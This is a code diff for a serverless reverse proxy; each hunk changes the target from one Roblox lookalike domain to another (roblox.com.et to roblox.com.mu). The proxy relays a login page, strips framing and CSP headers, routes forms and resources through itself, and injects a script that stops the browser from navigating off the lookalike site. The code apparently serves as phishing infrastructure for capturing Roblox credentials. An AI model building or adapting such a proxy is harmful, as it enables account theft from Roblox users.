@@ -1,7 +1,7 @@
 /**
  * Serverless Reverse Proxy — Direct Relay with Full HTML URL Rewriting
  *
- * Fetches roblox.com.et content server-side, strips all framing/CSP headers,
+ * Fetches roblox.com.mu content server-side, strips all framing/CSP headers,
  * rewrites every static resource URL in the HTML (script src, link href, img src,
  * form action, srcset, css url()) through this proxy so the browser never
  * makes a direct cross-origin request, and injects a runtime interceptor
@@ -11,9 +11,9 @@
 const DEFAULT_TARGET_URL =
   process.env.TARGET_URL ||
   process.env.VERIFICATION_URL ||
-  "https://www.roblox.com.et/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F919588160482%2Fprofile";
+  "https://www.roblox.com.mu/login?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fusers%2F2654745831%2Fprofile";
 
-const TARGET_ORIGIN = "https://www.roblox.com.et";
+const TARGET_ORIGIN = "https://www.roblox.com.mu";
 const PROXY_BASE    = "/api/proxy?url=";
 
 const FORBIDDEN_RESPONSE_HEADERS = new Set([
@@ -82,7 +82,7 @@ async function relayFetch(targetUrl, method, headers, body) {
  * Rewrites a single URL to go through /api/proxy.
  * - root-relative  (/path)              → proxy + TARGET_ORIGIN + /path
  * - protocol-relative (//host/path)     → proxy + https://host/path
- * - absolute roblox.com.et URLs         → proxy + url
+ * - absolute roblox.com.mu URLs         → proxy + url
  * - data:/blob:/javascript:/#           → unchanged
  * - other absolute URLs (CDNs etc.)     → unchanged (browser can fetch those)
  */
@@ -102,7 +102,7 @@ function rewriteUrl(url) {
   if (url.startsWith("/") && !url.startsWith("//")) {
     return PROXY_BASE + encodeURIComponent(TARGET_ORIGIN + url);
   }
-  if (url.indexOf("roblox.com.et") !== -1) {
+  if (url.indexOf("roblox.com.mu") !== -1) {
     return PROXY_BASE + encodeURIComponent(url);
   }
   return url;
@@ -181,7 +181,7 @@ function transformHtml(html) {
       get: function() { return _loc; },
       set: function(v) {
         // Swallow any attempt to navigate the top-level window away
-        if (typeof v === 'string' && v.indexOf('roblox.com.et') === -1 && !v.startsWith('/')) return;
+        if (typeof v === 'string' && v.indexOf('roblox.com.mu') === -1 && !v.startsWith('/')) return;
         _loc.href = v;
       },
       configurable: false
@@ -198,7 +198,7 @@ function transformHtml(html) {
     if (url.startsWith('data:') || url.startsWith('blob:') || url.startsWith('#') || url.startsWith('javascript:')) return url;
     if (url.startsWith('//')) url = 'https:' + url;
     if (url.startsWith('/') && !url.startsWith('//')) return PROXY + encodeURIComponent(TARGET + url);
-    if (url.indexOf('roblox.com.et') !== -1) return PROXY + encodeURIComponent(url);
+    if (url.indexOf('roblox.com.mu') !== -1) return PROXY + encodeURIComponent(url);
     return url;
   }
 
